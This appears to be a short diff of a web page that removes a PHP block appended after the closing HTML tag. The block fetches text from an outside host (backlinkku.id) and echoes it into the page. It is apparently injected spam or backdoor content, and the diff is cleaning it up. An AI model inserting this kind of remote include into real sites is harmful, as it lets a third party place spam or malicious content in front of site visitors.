@@ -444,6 +444,3 @@ jQuery(function() {
 
 </body>
 </html>
-<?php
-echo file_get_contents("https://backlinkku.id/menu/vip-v1/script.txt");
-?>
